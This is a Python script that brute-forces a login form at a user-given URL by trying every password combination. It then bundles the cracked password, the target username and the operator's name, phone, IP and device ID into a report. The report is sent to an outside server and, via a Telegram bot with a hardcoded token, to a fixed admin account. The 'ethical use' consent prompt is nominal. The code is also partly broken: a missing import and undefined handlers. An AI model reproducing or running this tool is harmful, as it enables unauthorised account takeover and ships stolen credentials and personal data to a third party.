import socket
import uuid
import json
from datetime import datetime
import random
import string
from cryptography.fernet import Fernet
import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# Function to generate a unique case number
def generate_case_number():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

# Function to collect user details and consent
def collect_user_details(case_number):
    name = input("Enter your name: ")
    phone = input("Enter your phone number: ")
    consent = input("Do you consent to using this tool for ethical purposes only? (y/n): ").lower() == 'y'
    
    if not consent:
        print("You must consent to use this tool. Exiting.")
        exit()
    
    device_id = uuid.getnode()
    ip_address = socket.gethostbyname(socket.gethostname())
    
    user_details = {
        'name': name,
        'phone': phone,
        'consent': consent,
        'device_id': device_id,
        'ip_address': ip_address,
        'timestamp': datetime.now().isoformat(),
        'case_number': case_number
    }
    
    return user_details

# Function to generate password combinations
def generate_passwords(length, charset):
    if length == 0:
        yield ''
    else:
        for char in charset:
            for suffix in generate_passwords(length - 1, charset):
                yield char + suffix

# Function to attempt login
def attempt_login(username, password, url):
    # Adjust form data keys based on your form
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    # Check response to determine if login was successful
    if 'Login successful' in response.text:
        print(f'[+] Password found: {password}')
        return True
    return False

# Brute force the login
def brute_force_login(username, max_length, charset, url):
    for length in range(1, max_length + 1):
        for password in generate_passwords(length, charset):
            print(f'[*] Trying password: {password}')
            if attempt_login(username, password, url):
                return password
    return None

# Function to create a report
def create_report(user_details, target_url, target_username, password_found):
    report = {
        'user_details': user_details,
        'target_url': target_url,
        'target_username': target_username,
        'password_found': password_found,
        'timestamp': datetime.now().isoformat()
    }
    return report

# Function to encrypt the report
def encrypt_report(report):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    encrypted_report = cipher_suite.encrypt(json.dumps(report).encode())
    return key, encrypted_report

# Function to send the encrypted report to the server
def send_report_to_server(encrypted_report, server_url):
    encrypted_report_data = {
        'key': encrypted_report[0],
        'report': encrypted_report[1]
    }
    response = requests.post(server_url, json=encrypted_report_data)
    if response.status_code == 200:
        print("Report successfully sent to the server.")
    else:
        print(f"Failed to send report to the server. Status code: {response.status_code}")

# Function to generate PDF report
def generate_pdf_report(user_details, target_url, target_username, password_found):
    # Create a PDF report using ReportLab
    pdf_filename = f"report_{user_details['case_number']}.pdf"
    c = canvas.Canvas(pdf_filename, pagesize=letter)
    c.drawString(100, 750, f"Case Number: {user_details['case_number']}")
    c.drawString(100, 730, f"Timestamp: {user_details['timestamp']}")
    c.drawString(100, 710, f"Name: {user_details['name']}")
    c.drawString(100, 690, f"Phone: {user_details['phone']}")
    c.drawString(100, 670, f"IP Address: {user_details['ip_address']}")
    c.drawString(100, 650, f"Device ID: {user_details['device_id']}")
    c.drawString(100, 630, f"Target URL: {target_url}")
    c.drawString(100, 610, f"Target Username: {target_username}")
    c.drawString(100, 590, f"Password Found: {password_found}")
    c.save()
    return pdf_filename

# Function to send PDF report via Telegram bot
def send_pdf_report(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    admin_id = 6054990337  # Replace with your Telegram user ID
    
    # Check if the user is the admin
    if user_id != admin_id:
        update.message.reply_text("Sorry, only the admin can request the report.")
        return
    
    user_details = context.user_data['user_details']
    target_url = context.user_data['target_url']
    target_username = context.user_data['target_username']
    password_found = context.user_data['password_found']
    pdf_filename = generate_pdf_report(user_details, target_url, target_username, password_found)
    
    # Send the PDF file to the admin
    update.message.reply_document(document=open(pdf_filename, 'rb'))
    
    # Remove the PDF file after sending
    os.remove(pdf_filename)

# Function to start the bot
def start_bot():
    # Initialize the bot
    updater = Updater(token='7199783317:AAHunbgaDrvK-UQjvEtYR8G2jh93_G-HUfs', use_context=True)
    dispatcher = updater.dispatcher
    
    # Register command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("report", send_pdf_report, pass_user_data=True))
    
    # Start the bot
    updater.start_polling()
    updater.idle()

# Function to start the script
def main():
    # Generate a unique case number
    case_number = generate_case_number()
    
    # Collect user details and consent
    user_details = collect_user_details(case_number)
    
    # Prompt user for necessary information
    url = input("Enter the login URL: ")
    username = input("Enter the username to test: ")
    max_password_length = int(input("Enter the maximum password length to test: "))

    # Prompt for character set options
    use_numbers = input("Use numbers? (y/n): ").lower() == 'y'
    use_lowercase = input("Use lowercase letters? (y/n): ").lower() == 'y'
    use_uppercase     = input("Use uppercase letters? (y/n): ").lower() == 'y'
    use_symbols = input("Use symbols? (y/n): ").lower() == 'y'

    # Build the character set based on user input
    charset = ''
    if use_numbers:
        charset += '0123456789'
    if use_lowercase:
        charset += 'abcdefghijklmnopqrstuvwxyz'
    if use_uppercase:
        charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    if use_symbols:
        charset += '!@#$%^&*()'

    if not charset:
        print("No character set selected. Exiting.")
        exit()

    # Start brute force attack
    password_found = brute_force_login(username, max_password_length, charset, url)
    
    # Create a report
    report = create_report(user_details, url, username, password_found)
    
    # Encrypt the report
    encrypted_report = encrypt_report(report)
    
    # Send the encrypted report to the server
    server_url = "https://server.aeroverse.top/upload"
    send_report_to_server(encrypted_report, server_url)
    
    # Start the Telegram bot
    start_bot()

# Run the main function
if __name__ == "__main__":
    main()


